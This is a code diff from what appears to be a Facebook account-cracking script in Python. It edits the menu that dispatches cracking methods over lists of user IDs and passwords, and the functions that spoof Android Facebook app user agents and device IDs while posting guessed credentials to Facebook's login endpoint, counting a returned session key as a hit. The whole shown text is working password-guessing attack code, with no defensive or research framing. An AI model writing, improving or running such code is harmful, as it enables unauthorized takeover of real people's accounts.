@@ -229,7 +229,7 @@ def menu():
                                                 elif mthd in ['2','02']:
                                                         crack_submit.submit(ffb3,ids,names,passlist)
                                                 elif mthd in ['3','03']:
-                                                        crack_submit.submit(api1,ids,names,passlist)
+                                                        crack_submit.submit(api,ids,names,passlist)
                                                 elif mthd in ['4','04']:
                                                         crack_submit.submit(api2,ids,names,passlist)        
                                                 else:
@@ -376,7 +376,7 @@ def api(ids,names,passlist):
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
                                 ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-                                device_id = str(uuid.uuid4())
+                                device_id = str(random.randint(11111111,9999999999))
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
                                         'email':ids,
@@ -637,7 +637,7 @@ def api2(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://b-graph.facebook.com/method/auth/login'
+                                url = ' https://api.facebook.com/method/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
